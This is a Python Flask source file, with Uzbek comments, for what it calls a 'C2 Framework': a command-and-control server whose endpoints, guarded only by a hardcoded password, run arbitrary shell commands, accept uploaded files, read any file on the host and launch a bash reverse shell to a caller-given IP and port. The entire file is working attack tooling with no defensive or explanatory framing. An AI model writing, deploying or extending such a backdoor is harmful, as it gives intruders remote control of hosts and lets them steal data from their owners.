from flask import Flask, request, jsonify
import subprocess
import os
from functools import wraps

app = Flask(__name__)

# Authentication uchun parol
PASSWORD = "fotima"  # Parolni o'zgartiring

# Authentication dekoratori
def authenticate(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get('Authorization')
        if auth == PASSWORD:
            return f(*args, **kwargs)
        else:
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
    return wrapper

# Asosiy sahifa
@app.route('/')
def index():
    return "C2 Framework is running!"

# Buyruq bajarish
@app.route('/cmd', methods=['POST'])
@authenticate
def execute_command():
    data = request.json
    command = data.get('command')
    
    try:
        result = subprocess.check_output(
            command, 
            shell=True, 
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        return jsonify({
            'status': 'success',
            'output': result
        })
    except subprocess.CalledProcessError as e:
        return jsonify({
            'status': 'error',
            'output': str(e.output)
        })

# Fayl yuklash
@app.route('/upload', methods=['POST'])
@authenticate
def upload_file():
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file part'})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No selected file'})
    
    save_path = os.path.join('/tmp', file.filename)
    file.save(save_path)
    
    return jsonify({
        'status': 'success',
        'message': f'File {file.filename} uploaded successfully',
        'path': save_path
    })

# Reverse shell
@app.route('/reverse_shell', methods=['POST'])
@authenticate
def reverse_shell():
    data = request.json
    ip = data.get('ip')
    port = data.get('port')
    
    try:
        subprocess.Popen(
            f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        return jsonify({
            'status': 'success',
            'message': f'Reverse shell started to {ip}:{port}'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        })

# Fayl ko'chirish
@app.route('/download', methods=['POST'])
@authenticate
def download_file():
    data = request.json
    file_path = data.get('file_path')
    
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        return jsonify({
            'status': 'success',
            'file_data': file_data.decode('utf-8', errors='ignore')
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        })

# Himoyalangan route
@app.route('/protected')
@authenticate
def protected_route():
    return "This is a protected route!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
